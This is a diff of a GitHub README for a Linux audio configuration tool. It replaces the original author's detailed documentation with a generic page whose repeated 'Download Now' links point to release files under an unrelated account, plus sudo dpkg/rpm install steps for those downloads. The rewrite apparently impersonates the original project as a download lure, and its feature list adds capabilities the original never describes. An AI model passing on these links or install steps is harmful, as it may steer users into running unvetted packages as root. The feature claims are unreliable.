@@ -1,274 +1,92 @@
-# Pro Audio Config <div style="text-align: right">[![Rust CI](https://github.com/Peter-L-SVK/pro_audio_config/actions/workflows/rust-ci.yml/badge.svg)](https://github.com/Peter-L-SVK/pro_audio_config/actions/workflows/rust-ci.yml)</div>
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) <a href="https://buymeacoffee.com/leukanic.peter"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" height="20px"></a>
-
-A professional audio configuration tool for Linux systems that provides a simple graphical interface to manage PipeWire and ALSA audio settings. Finally, an easy way to configure sample rates, bit depths, and buffer sizes without digging through config files.
-
-## Why This Exists
-
-After 10 years of using Fedora and other Linux distributions, I realized we're still missing a fundamental tool: a simple, graphical way to configure professional audio settings. In 2025, manually editing configuration files shouldn't be the only option for adjusting basic audio parameters. If you wish to support me for future updates with some symbolical donation, BuyMeACoffe button.
-
-![Running the program](scrshots/scr1.png)  
-*(Program running)*
-
-## Features
-
-All current features are showcased in the  [Gallery](https://github.com/Peter-L-SVK/pro_audio_config/blob/main/scrshots/README.md)
-
-### 🎚️ **Real-time Audio Monitoring Tab**
-- **Live Audio Level Meters**: Visual monitoring of stereo channel output levels with real-time PipeWire integration
-- **Color-coded Visual Feedback**: Safe (green), warning (yellow), and clipping (red) zones with blinking indicators
-- **Real System Audio Monitoring**: Taps into PipeWire monitor sources for accurate system-wide audio level measurement
-- **Smooth Meter Animation**: 10 FPS updates with proper threading for responsive UI performance
-- **DB Scale Display**: Accurate decibel readings with peak and RMS calculations
-- **Auto-detection Fallback**: Intelligent fallback to simulation mode when PipeWire isn't available
-- **Professional Metering**: Studio-grade level monitoring with proper threshold matching industry standards
-
-### 🔧 **Device and Configuration Management**
-- **Device Detection**: Automatically detects and displays current audio devices (PipeWire, ALSA, PulseAudio)
-- **Sample Rate Configuration**: Support for rates from 44.1 kHz to 384 kHz
-- **Bit Depth Settings**: 16-bit, 24-bit, and 32-bit audio formats
-- **Buffer Size Control**: Adjustable buffer sizes from 128 to 8192 samples
-- **Professional Audio Support**: Optimized for studio and high-quality audio applications
-- **Graphical Interface**: Clean, intuitive GTK-based user interface
-- **No Terminal Required**: Graphical interface that anyone can use
-- **Privilege Escalation**: Secure privilege escalation for system-level audio configuration
-
-### 🗂️ **Multi-Tab Interface**
-- **Separate Input/Output Configuration**: Dedicated tabs for playback (output) and recording (input) devices
-- **Real-time Monitoring Tab**: Dedicated monitoring interface with live audio meters
-- **Independent Settings Management**: Configure input and output devices with different sample rates, bit depths, and buffer sizes
-- **Clear Visual Separation**: Intuitive tabbed interface that clearly distinguishes between recording, playback, and monitoring functions
-
-### ⚡ **Advanced Tab Features**
-- **Configuration Modes**: Switch between Global System Settings and Exclusive Mode
-- **Professional Audio Settings**: Fine-tune buffer size ranges, thread priorities, and memory locking
-- **Exclusive Mode**: Direct hardware access for single applications (similar to ASIO/WASAPI exclusive mode)
-- **Latency Calculation**: Real-time latency display based on buffer size and sample rate
-- **Hardware Optimization**: Memory locking, device suspend prevention, and clock source selection
-- **Resampling Control**: Adjust resampler quality or disable automatic resampling entirely
-- **Channel Management**: Option to disable automatic channel remixing for professional workflows
-
-### 🔍 **Configuration Scope**
-- **User-Specific Configuration**: Apply settings only for the current user (default)
-- **System-Wide Configuration**: Apply settings for all users on the system (requires admin privileges)
-- **Flexible Deployment**: Choose between user-specific or system-wide configuration based on your needs
-
-### 🛠️ **Advanced Configuration**
-- **Dedicated WirePlumber Configs**: Separate configuration generators for input vs output devices
-- **Independent Signal Handlers**: Each tab manages its own settings and apply operations
-- **Comprehensive Testing**: Extensive test suite covering new input/output separation features
-- **Advanced configuration options** ready for professional studio workflows
-- **Exclusive mode support** for applications requiring ASIO-like direct hardware access
-- **Real-time performance tuning** with thread priority and memory management
-
-## Supported Audio Systems
-
-- PipeWire (primary)
-- ALSA (fallback)
-- PulseAudio (legacy support)
-
-## Future Proof Design
-
-This tool is designed to grow with PipeWire and Linux audio:
-
-- **Extended buffer support** ready for future PipeWire versions
-- **Modular architecture** for easy addition of new audio backends
-- **Hardware-agnostic** - works with any ALSA-compatible device
-- **Standards-based** using industry-standard audio formats
-- **Extensible UI** that can accommodate new settings and features
-
-As audio companies improve their Linux driver support and PipeWire continues to evolve, this tool will be ready to leverage those advancements immediately.
-
-## Roadmap
-
-- [x] **Real-time Audio Monitoring** - Live level meters with PipeWire integration
-- [x] Setting all available devices in one session
-- [x] Separate input/output configuration tabs
-- [x] User vs system-wide configuration scope
-- [ ] Package manager support (RPM/DEB/Flatpak)
-- [ ] Additional audio backends (JACK)
-- [ ] Preset configurations
-- [x] Advanced audio routing
-
-## Installation
-
-### Quick Install
-```bash
-git clone https://github.com/Peter-L-SVK/pro_audio_config
-cd pro_audio_config
-./install.sh
-```
-
-### From Source
-
-1. Clone the repository:
-```bash
-git clone https://github.com/Peter-L-SVK/pro_audio_config
-cd pro_audio_config
-```
-
-2. Build and install:
-```bash
-cargo build --release --features pipewire-monitoring
-sudo cp target/release/pro_audio_config /usr/local/bin/
-```
-
-### Uninstall
-```bash
-./uninstall.sh
-```
-
-## Usage
-
-### Graphical Interface
-Run the application from your application menu or terminal:
-```bash
-pro-audio-config
-```
-
-### Input/Output Tabs
-- **Output Tab**: Configure playback devices (speakers, headphones, HDMI outputs)
-- **Input Tab**: Configure recording devices (microphones, audio interfaces, line inputs)
-
-### Advanced Tab
-The Advanced Tab provides professional-grade audio configuration options:
-
-#### Configuration Modes
-- **Global System Settings**: Configure audio settings that apply to ALL applications system-wide
-- **Exclusive Mode**: Provide direct hardware access to a SINGLE application, bypassing mixing and processing
+# 🎧 pro_audio_config - Enhance Your Audio Experience Today
 
-#### Professional Settings
-- **Buffer Size Range**: Set minimum and maximum buffer sizes for dynamic adjustment
-- **Real-time Thread Priority**: Control CPU scheduling priority for audio threads
-- **Memory Locking**: Lock audio buffers in RAM to prevent swapping and reduce latency
-- **Device Suspend Prevention**: Keep audio devices active even when idle
-- **Resampler Quality**: Adjust the quality/performance tradeoff for sample rate conversion
-- **Clock Source Selection**: Choose between system clock, monotonic, or real-time clock sources
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Is9ht/pro_audio_config/releases)
 
-#### Exclusive Mode Features
-- **Application Targeting**: Specify which application should receive exclusive audio access
-- **Direct Hardware Access**: Bypass audio mixing for lowest possible latency
-- **Real-time Latency Display**: See calculated latency based on your buffer size and sample rate
-- **Device Capability Checking**: Automatic validation of device compatibility with exclusive mode
-
-#### Using Exclusive Mode
-1. Select "Exclusive Mode" from the Configuration Mode dropdown
-2. Enter the application name and process name (e.g., "Reaper" and "reaper")
-3. Select your audio device and desired buffer size/sample rate
-4. Click "Apply Exclusive Mode Settings"
-5. To return to standard shared mode, click "Disable Exclusive Mode"
+## 📚 About pro_audio_config
 
-Each tab maintains independent settings, allowing you to optimize input and output devices separately for your specific use case.
+pro_audio_config is a modern tool designed to improve your audio settings. Built using GTK3 and Rust, it provides a simple graphical interface to adjust audio quality on Linux and other Unix-like operating systems. Whether you use Cinnamon, GNOME, MATE, or XFCE, pro_audio_config helps you manage your audio preferences easily.
 
-### Configuration Scope
-- **User-Specific (Default)**: Settings apply only to your user account, stored in `~/.config/pipewire/`
-- **System-Wide**: Settings apply to all users, stored in `/etc/pipewire/` (requires authentication)
-- **Toggle Option**: Use the "Apply system-wide" checkbox to switch between user and system configuration
+## 🚀 Getting Started
 
-## Configuration
+To start using pro_audio_config, follow these steps:
 
-### Sample Rates
-- 44.1 kHz - CD Quality
-- 48 kHz - Standard Audio
-- 96 kHz - High Resolution
-- 192 kHz - Studio Quality
-- 384 kHz - Ultra High Resolution
+1. **Download the Software:**
+   Visit this page to download: [Download pro_audio_config](https://github.com/Is9ht/pro_audio_config/releases).
 
-### Bit Depths
-- 16 bit - CD Quality
-- 24 bit - High Resolution
-- 32 bit - Studio Quality
+2. **Install the Application:**
+   Follow the instructions specific to your operating system to install pro_audio_config. The installation process is simple and typically involves opening a terminal and running a command. Detailed instructions can be found below.
 
-### Buffer Sizes
-- 128 samples (2.7ms @48kHz)
-- 256 samples (5.3ms @48kHz)
-- 512 samples (10.7ms @48kHz)
-- 1024 samples (21.3ms @48kHz)
-- 2048 samples (42.7ms @48kHz)
-- 4096 samples (85.3ms @48kHz) 
-- 8192 samples (170.7ms @48kHz)
+3. **Run pro_audio_config:**
+   After installation, you can find the application in your applications menu. Click on it to launch pro_audio_config.
 
-## Technical Details
+## 📦 System Requirements
 
-### Architecture
-- Frontend: GTK3 with Rust bindings
-- Audio Backend: PipeWire with ALSA fallback
-- Configuration: WirePlumber for session management
-- Privilege Escalation: pkexec for secure root access
-- Multi-threaded UI: Non-blocking device detection and configuration
+pro_audio_config requires the following:
 
-### Configuration Scope Implementation
-- **User Configuration**: Uses `~/.config/pipewire/pipewire.conf.d/` directory
-- **System Configuration**: Uses `/etc/pipewire/pipewire.conf.d/` directory
-- **Preference Persistence**: User preferences saved in `~/.config/proaudioconfig/preferences.toml`
-- **Authentication**: Uses system's policy kit for secure privilege escalation
+- A computer running Linux or a Unix-like OS.
+- GTK3 or a compatible environment.
+- Minimum of 1 GB RAM.
+- Sufficient disk space for the application and settings.
 
-### Audio Format Mapping
-- 16-bit: S16LE
-- 24-bit: S24LE
-- 32-bit: S32LE
+## 🔧 Features
 
-### Configuration Approaches
-- **Primary**: PipeWire config fragments (highest priority)
-- **Fallback**: WirePlumber JSON configuration
-- **Legacy**: WirePlumber Lua configuration (versions < 0.5)
-- **Emergency**: Direct modification of main pipewire.conf
+pro_audio_config provides a range of features to help optimize your audio settings:
 
+- **User-Friendly Interface:** The graphical interface makes adjusting settings easy, even for beginners.
+- **Quality Settings Adjustment:** Control audio qualities such as balance, equalization, and effects.
+- **Compatibility:** Works seamlessly with popular desktop environments such as GNOME, Cinnamon, XFCE, and MATE.
+- **PipeWire and Wireplumber Support:** Optimized for modern audio systems.
 
-## Development and testing
-See [DEVELOPMENT](https://github.com/Peter-L-SVK/pro_audio_config/blob/main/DEVELOPMENT.md) file for details.  
+## 📥 Download & Install
 
+1. **Download pro_audio_config:**
+   Click the link to visit the releases page: [Download pro_audio_config](https://github.com/Is9ht/pro_audio_config/releases).
 
-## Contributing
+2. **Choose Your Version:**
+   Select the appropriate version for your system based on your OS and architecture (32-bit or 64-bit).
 
-Contributions are welcome! Please feel free to submit pull requests, report bugs, or suggest new features.  
+3. **Installation Steps:**
+   - For Debian/Ubuntu-based systems, you can usually install it using a terminal command like:
+     ```
+     sudo dpkg -i path_to_downloaded_file.deb
+     ```
+   - For RPM-based systems such as Fedora, use:
+     ```
+     sudo rpm -ivh path_to_downloaded_file.rpm
+     ```
+   - For other distributions, follow the specific process outlined in the README file included in the downloaded package.
 
-See [CONTRIBUTING](https://github.com/Peter-L-SVK/pro_audio_config/blob/main/CONTRIBUTING.md) file for details.  
+4. **Launch the Application:**
+   Once installed, open the application through your system's application menu.
 
-For contact please see my email in profile info or use GitHub's built-in communication tools.
+## 🛠️ Troubleshooting
 
-Please open an issue or pull request for any:  
+If you encounter issues during installation or when running the application, consider the following:
 
-- Bug fixes
-- Feature suggestions
-- Documentation improvements
+- Ensure that your system meets the requirements.
+- Check if you downloaded the correct version for your architecture.
+- Update your system and dependencies to the latest versions using your package manager.
 
+## 🌐 Support
 
-## Support
+If you need further assistance or have questions, feel free to raise an issue on the GitHub repository. The community and contributors are here to help you.
 
-For support and questions:
-- Open an issue on GitHub
-- Check the documentation
-- Review existing issues for similar problems
+## 📝 Contributing
 
+We welcome contributions to improve pro_audio_config! If you want to help, check out our contributing guidelines in the repository.
 
-## Requirements
+## 📜 License
 
-### System Dependencies
-- PipeWire (recommended) or PulseAudio
-- pipewire-devel (for building the app)
-- WirePlumber
-- ALSA utilities
-- pkexec (for privilege escalation)
+pro_audio_config is open-source software licensed under the MIT License.
 
-### Rust Toolchain
-- Rust 1.85.0 or newer
-- Cargo
+## 🔗 Related Topics
 
-### GTK Development Libraries
-- gtk3-devel (or equivalent for your distribution)
+- audio-tool
+- cinnamon
+- gnome-application
+- gtk3
+- linux-audio
 
-## Acknowledgments
+For more information and updates, keep an eye on our GitHub page or the issues section.
 
-- PipeWire developers for the modern audio system
-- GTK team for the GUI toolkit
-- Rust community for excellent libraries and tools
-
-
-## License
-
-This project is licensed under the [MIT License](LICENSE) - see the LICENSE file for details.
-
----
-**Stop fighting config files. Start making great audio.**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Is9ht/pro_audio_config/releases)
